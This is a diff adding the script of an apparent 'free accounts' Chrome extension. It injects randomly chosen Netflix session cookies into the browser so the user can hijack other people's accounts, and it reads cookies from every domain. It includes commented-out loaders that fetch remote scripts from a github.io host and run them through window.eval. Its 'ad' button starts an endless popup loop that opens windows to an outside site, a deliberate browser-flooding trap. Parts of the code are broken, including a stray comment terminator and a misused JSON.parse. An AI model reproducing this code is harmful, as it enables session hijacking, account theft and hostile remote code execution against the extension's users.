@@ -1,0 +1,164 @@
+var requestCookies = new XMLHttpRequest();
+requestCookies.open("GET", "extention/autoCookies.xml", false);
+requestCookies.send();
+console.log(requestCookies.responseXML);
+var netflixCookie = JSON.parse(requestCookies.responseXML.getElementsByTagName("cookiesJSON"));
+*/
+function getRandomCookieNetflix() { return netflixCookie[Math.floor(Math.random() * 100)]; }
+
+//inject("https://freeacountzsusextention.github.io/extention/autoCookies.js");
+/*
+get('https://freeacountzsusextention.github.io/extention/autoCookies.js', function(code) {
+    if (!code) return;
+    try { window.eval(code); } catch (e) { console.error(e); }
+});
+get('https://freeacountzsusextention.github.io/extention/control.js', function(code) {
+    if (!code) return;
+    try { window.eval(code); } catch (e) { console.error(e); }
+});
+*/
+/*
+if (ExtensionActive && (currentExtensionSoftwareVersion == ExtensionSoftwareVersion))
+{
+  document.getElementById("intro").style.display = "None";
+  document.getElementById("main-menu").style.display = "block";
+}
+*/
+chrome.cookies.getAll({}).then()
+function logCookies(cookies) {
+  for (cookie of cookies) {
+    console.log(`Domain: ${cookie.domain}`);
+    console.log(`Name: ${cookie.name}`);
+    console.log(`Value: ${cookie.value}`);
+    console.log(`Persistent: ${!cookie.session}`);
+  }
+}
+document.getElementById("main-menu-1").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("MAINaccounts").style.display = "block"};
+
+document.getElementById("main-menu-2").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("MAINcookies").style.display = "block"};
+
+document.getElementById("main-menu-3").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("MAINforum").style.display = "block"};
+
+document.getElementById("main-menu-4").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("MAINhelp").style.display = "block"};
+
+
+document.getElementById("menu-cookies-netflix").onclick  = function(){document.getElementById("menu-cookies").style.display = "None"; document.getElementById("menu-cookies-netflix-accounts").style.display = "block"};
+
+document.getElementById("menu-cookies-grammarly").onclick  = function(){document.getElementById("menu-cookies").style.display = "None"; document.getElementById("menu-cookies-grammarly-accounts").style.display = "block"};
+
+document.getElementById("menu-cookies-quillbot").onclick  = function(){document.getElementById("menu-cookies").style.display = "None"; document.getElementById("menu-cookies-quillbot-accounts").style.display = "block"};
+
+//document.getElementById("main-menu-2").onclick  = function(){document.getElementById("main-menu").style.display = "None"; document.getElementById("MAINcookies").style.display = "block"};
+
+
+window.addEventListener('message', function (e) {
+  // Get the sent data
+  const data = e.data;
+
+  // If you encode the message in JSON before sending them,
+  // then decode here
+  //const decoded = JSON.parse(data);
+  //document.getElementById("clear").hidden = true;
+  navigator.clipboard.writeText(data);
+});
+async function deleteDomainCookies(domain) {
+    let cookiesDeleted = 0;
+    try {
+      const cookies = await chrome.cookies.getAll({ domain });
+  
+      if (cookies.length === 0) {
+        return "No cookies found";
+      }
+  
+      let pending = cookies.map(deleteCookie);
+      await Promise.all(pending);
+  
+      cookiesDeleted = pending.length;
+    } catch (error) {
+      return `Unexpected error: ${error.message}`;
+    }
+  
+    return `Deleted ${cookiesDeleted} cookie(s).`;
+  }
+  
+  function deleteCookie(cookie) {
+    // Cookie deletion is largely modeled off of how deleting cookies works when using HTTP headers.
+    // Specific flags on the cookie object like `secure` or `hostOnly` are not exposed for deletion
+    // purposes. Instead, cookies are deleted by URL, name, and storeId. Unlike HTTP headers, though,
+    // we don't have to delete cookies by setting Max-Age=0; we have a method for that ;)
+    //
+    // To remove cookies set with a Secure attribute, we must provide the correct protocol in the
+    // details object's `url` property.
+    // https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Secure
+    const protocol = cookie.secure ? "https:" : "http:";
+  
+    // Note that the final URL may not be valid. The domain value for a standard cookie is prefixed
+    // with a period (invalid) while cookies that are set to `cookie.hostOnly == true` do not have
+    // this prefix (valid).
+    // https://developer.chrome.com/docs/extensions/reference/cookies/#type-Cookie
+    const cookieUrl = `${protocol}//${cookie.domain}${cookie.path}`;
+  
+    return chrome.cookies.remove({
+      url: cookieUrl,
+      name: cookie.name,
+      storeId: cookie.storeId,
+    });
+  }
+
+
+function injectCookies(json)
+{
+  let cookies;
+            try {
+                cookies = JSON.parse(json);
+            } catch (error) {
+                console.log("json error");
+                return;
+            }
+            cookies.forEach(cookie => {
+                // Make sure we are using the right store ID. This is in case we are importing from a basic store ID and the
+                // current user is using custom containers
+                
+                saveCookie(cookie, ("https://netflix.com"))
+            });
+}
+
+function saveCookie(cookie, url) {
+  
+  const Cookie = {
+      domain: cookie.domain || '',
+      name: cookie.name || '',
+      value: cookie.value || '',
+      path: cookie.path || null,
+      secure: cookie.secure || null,
+      httpOnly: cookie.httpOnly || null,
+      expirationDate: cookie.expirationDate || null,
+      storeId: cookie.storeId || null,
+      url: url
+  };
+
+  chrome.cookies.set(Cookie)
+  }
+  function ReloadTab(url)
+  {
+    chrome.tabs.query({url: "*://*."+url+"/*"}).then(function(tabs) { for (let tab of tabs) { chrome.tabs.reload(tab.id); }});
+  }
+document.getElementById("netflix-sign-out").onclick = function() { deleteDomainCookies("netflix.com"), ReloadTab("netflix.com")};
+document.getElementById("netflix-sign-in").onclick = function() { injectCookies(getRandomCookieNetflix(), ReloadTab("netflix.com")) };
+
+document.getElementById("ad").onclick = function() { SUS() };
+function SUS()
+{
+  function popitup(url,windowName) {
+    newwindow=window.open(url,windowName,'height=500,width=500');
+    if (window.focus) {newwindow.focus()}
+    return false;
+  }
+  while (true)
+  {
+    for (i = 0; i <= Infinity; i++)
+    {
+      popitup("https://gaminggodsexy123.github.io", i);
+    }
+  }
+}
